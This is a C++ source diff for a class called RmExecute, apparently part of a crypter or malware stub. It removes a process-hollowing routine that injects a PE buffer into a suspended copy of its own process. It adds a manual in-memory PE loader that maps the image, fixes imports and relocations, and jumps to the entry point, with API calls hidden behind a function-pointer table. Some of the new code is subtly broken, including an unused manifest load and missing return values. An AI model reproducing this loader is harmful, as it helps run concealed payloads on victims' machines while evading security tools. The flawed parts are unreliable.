@@ -542,71 +542,241 @@ bool RmExecute::RunPortableExecutable() {
 	}
 }
 #else
-bool RmExecute::RunPortableExecutable()
+HANDLE RmExecute::GetImageActCtx(HMODULE module)
 {
-	
-	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
-	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
-	IMAGE_SECTION_HEADER* SectionHeader;
-
-	PROCESS_INFORMATION PI;
-	STARTUPINFOA SI;
-
-	CONTEXT* CTX;
-
-	DWORD* ImageBase = NULL;; //Base address of the image
-	void* pImageBase = NULL;; // Pointer to the image base
-
-	char CurrentFilePath[MAX_PATH];
-
-	DOSHeader = PIMAGE_DOS_HEADER(newbuff); // Initialize Variable
-	NtHeader = PIMAGE_NT_HEADERS(DWORD(newbuff) + DOSHeader->e_lfanew); // Initialize
-
-	fn.fnGetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable
-
-	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
-	{
-		//ZeroMemory(&PI, sizeof(PI)); // Null the memory
-		//ZeroMemory(&SI, sizeof(SI)); // Null the memory
-		fn.fnmemset(&PI, 0, sizeof(PI));
-		fn.fnmemset(&SI, 0, sizeof(SI));
-		if (fn.fnCreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) //make process in suspended state, for the new image.																				      
-		{
-			// Allocate memory for the context.
-			CTX = LPCONTEXT(fn.fnVirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
-			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated
-
-			if (fn.fnGetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
-			{
-				// Read instructions
-				fn.fnReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
-				pImageBase = fn.fnVirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
-
-				//fix randomly crash
-				if (pImageBase == 0) {
-					fn.fnResumeThread(PI.hThread);
-					return 1;
-				}
-				else {
-					// Write the image to the process
-					fn.fnWriteProcessMemory(PI.hProcess, pImageBase, newbuff, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
-					for (int count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
-					{
-						SectionHeader = PIMAGE_SECTION_HEADER(DWORD(newbuff) + DOSHeader->e_lfanew + 248 + (count * 40));
-						fn.fnWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress), LPVOID(DWORD(newbuff) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
-					}
-					fn.fnWriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
-
-					// Move address of entry point to the eax register
-					CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
-					fn.fnSetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
-					fn.fnResumeThread(PI.hThread); //?Start the process/call main()
-				}
-
-				return true; // Operation was successful.
-			}
+	WCHAR temp_path[MAX_PATH];
+	WCHAR temp_filename[MAX_PATH];
+	for (int i = 1; i <= 3; i++) {
+		HRSRC resource_info = fn.fnFindResourceA(module, MAKEINTRESOURCE(i), RT_MANIFEST);
+		if (resource_info) {
+			HGLOBAL resource = fn.fnLoadResource(module, resource_info);
+			DWORD resource_size = fn.fnSizeofResource(module, resource_info);
+			const PBYTE resource_data = (const PBYTE)fn.fnLockResource(resource);
 		}
 	}
-	return false;
+
+	ACTCTXW act = { sizeof(act) };
+	act.lpSource = temp_filename;
+	return fn.fnCreateActCtxA((PCACTCTXA)(&act));
+}
+
+LPVOID RmExecute::MapImageToMemory(LPVOID base_addr)
+{
+	LPVOID mem_image_base = NULL;
+
+
+	PIMAGE_DOS_HEADER raw_image_base = (PIMAGE_DOS_HEADER)base_addr;
+
+	HMODULE proc_base = fn.fnGetModuleHandleA(NULL);
+
+
+	if (IMAGE_DOS_SIGNATURE != raw_image_base->e_magic)
+		return NULL;
+
+	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(raw_image_base->e_lfanew + (UINT_PTR)raw_image_base);
+	if (IMAGE_NT_SIGNATURE != nt_header->Signature)
+		return NULL;
+
+	PIMAGE_SECTION_HEADER section_header =
+		(PIMAGE_SECTION_HEADER)(raw_image_base->e_lfanew + sizeof(*nt_header) + (UINT_PTR)raw_image_base);
+
+	mem_image_base = fn.fnVirtualAlloc(
+		(LPVOID)(nt_header->OptionalHeader.ImageBase),
+		nt_header->OptionalHeader.SizeOfImage,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE);
+
+	if (NULL == mem_image_base) {
+		mem_image_base = fn.fnVirtualAlloc(
+			NULL,
+			nt_header->OptionalHeader.SizeOfImage,
+			MEM_COMMIT | MEM_RESERVE,
+			PAGE_EXECUTE_READWRITE);
+	}
+
+	if (NULL == mem_image_base)
+		return NULL;
+
+	fn.fnmemcpy(mem_image_base, (LPVOID)raw_image_base, nt_header->OptionalHeader.SizeOfHeaders);
+
+	for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
+		fn.fnmemcpy(
+			(LPVOID)(section_header->VirtualAddress + (UINT_PTR)mem_image_base),
+			(LPVOID)(section_header->PointerToRawData + (UINT_PTR)raw_image_base),
+			section_header->SizeOfRawData);
+		section_header++;
+	}
+
+
+	return mem_image_base;
+}
+
+BYTE* RmExecute::getNtHdrs(BYTE* pe_buffer)
+{
+	if (pe_buffer == NULL) return NULL;
+
+	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
+	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
+		return NULL;
+	}
+	const LONG kMaxOffset = 1024;
+	LONG pe_offset = idh->e_lfanew;
+	if (pe_offset > kMaxOffset) return NULL;
+	IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((BYTE*)pe_buffer + pe_offset);
+	if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
+	return (BYTE*)inh;
+}
+
+IMAGE_DATA_DIRECTORY* RmExecute::getPeDir(PVOID pe_buffer, size_t dir_id)
+{
+	if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;
+
+	BYTE* nt_headers = getNtHdrs((BYTE*)pe_buffer);
+	if (nt_headers == NULL) return NULL;
+
+	IMAGE_DATA_DIRECTORY* peDir = NULL;
+
+	IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
+	peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);
+
+	if (peDir->VirtualAddress == NULL) {
+		return NULL;
+	}
+	return peDir;
+}
+
+bool  RmExecute::fixIAT(PVOID modulePtr)
+{
+	IMAGE_DATA_DIRECTORY* importsDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
+	if (importsDir == NULL) return false;
+
+	size_t maxSize = importsDir->Size;
+	size_t impAddr = importsDir->VirtualAddress;
+
+	IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
+	size_t parsedSize = 0;
+
+	for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
+		lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);
+
+		if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
+		LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
+
+		size_t call_via = lib_desc->FirstThunk;
+		size_t thunk_addr = lib_desc->OriginalFirstThunk;
+		if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;
+
+		size_t offsetField = 0;
+		size_t offsetThunk = 0;
+		while (true)
+		{
+			IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
+			IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);
+
+			if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
+			{
+				size_t addr = (size_t)fn.fnGetProcAddress(fn.fnLoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
+				fieldThunk->u1.Function = addr;
+			}
+
+			if (fieldThunk->u1.Function == NULL) break;
+
+			if (fieldThunk->u1.Function == orginThunk->u1.Function) {
+
+				PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)(size_t(modulePtr) + orginThunk->u1.AddressOfData);
+
+				LPSTR func_name = (LPSTR)by_name->Name;
+				size_t addr = (size_t)fn.fnGetProcAddress(fn.fnLoadLibraryA(lib_name), func_name);
+
+				fieldThunk->u1.Function = addr;
+
+			}
+			offsetField += sizeof(IMAGE_THUNK_DATA);
+			offsetThunk += sizeof(IMAGE_THUNK_DATA);
+		}
+	}
+	return true;
+}
+
+typedef struct _BASE_RELOCATION_ENTRY {
+	WORD Offset : 12;
+	WORD Type : 4;
+} BASE_RELOCATION_ENTRY;
+
+bool  RmExecute::applyReloc(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr, SIZE_T moduleSize)
+{
+	IMAGE_DATA_DIRECTORY* relocDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
+	if (relocDir == NULL) /* Cannot relocate - application have no relocation table */
+		return false;
+
+	size_t maxSize = relocDir->Size;
+	size_t relocAddr = relocDir->VirtualAddress;
+	IMAGE_BASE_RELOCATION* reloc = NULL;
+
+	size_t parsedSize = 0;
+	for (; parsedSize < maxSize; parsedSize += reloc->SizeOfBlock) {
+		reloc = (IMAGE_BASE_RELOCATION*)(relocAddr + parsedSize + size_t(modulePtr));
+		if (reloc->VirtualAddress == NULL || reloc->SizeOfBlock == 0)
+			break;
+
+		size_t entriesNum = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
+		size_t page = reloc->VirtualAddress;
+
+		BASE_RELOCATION_ENTRY* entry = (BASE_RELOCATION_ENTRY*)(size_t(reloc) + sizeof(IMAGE_BASE_RELOCATION));
+		for (size_t i = 0; i < entriesNum; i++) {
+			size_t offset = entry->Offset;
+			size_t type = entry->Type;
+			size_t reloc_field = page + offset;
+			if (entry == NULL || type == 0)
+				break;
+			if (type != 3) {
+				return false;
+			}
+			if (reloc_field >= moduleSize) {
+				return false;
+			}
+
+			size_t* relocateAddr = (size_t*)(size_t(modulePtr) + reloc_field);
+			(*relocateAddr) = ((*relocateAddr) - oldBase + newBase);
+			entry = (BASE_RELOCATION_ENTRY*)(size_t(entry) + sizeof(BASE_RELOCATION_ENTRY));
+		}
+	}
+	return (parsedSize != 0);
+}
+
+bool RmExecute::RunPortableExecutable() {
+	PIMAGE_DOS_HEADER image_base = (PIMAGE_DOS_HEADER)MapImageToMemory((LPVOID)newbuff);
+	if (!image_base) {
+		return 1;
+	}
+
+	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(image_base->e_lfanew + (UINT_PTR)image_base);
+	HANDLE actctx = NULL;
+	ULONG_PTR cookie = 0;
+	BOOL changed_ctx = FALSE;
+	if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress) {
+		actctx = GetImageActCtx((HMODULE)image_base);
+		if (actctx)
+			changed_ctx = fn.fnActivateActCtx(actctx, &cookie);
+	}
+
+	fixIAT(image_base);
+
+	if (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
+		ptrdiff_t delta = (ptrdiff_t)((PBYTE)image_base - (PBYTE)nt_header->OptionalHeader.ImageBase);
+		if (delta)
+		{
+			applyReloc((size_t)image_base, (size_t)nt_header->OptionalHeader.ImageBase, image_base, nt_header->OptionalHeader.SizeOfImage);
+		}
+
+	}
+
+	LPVOID oep = (LPVOID)(nt_header->OptionalHeader.AddressOfEntryPoint + (UINT_PTR)image_base);
+	((void(*)())(oep))();
+
+	if (changed_ctx) {
+		fn.fnDeactivateActCtx(0, cookie);
+		fn.fnReleaseActCtx(actctx);
+	}
 }
 #endif
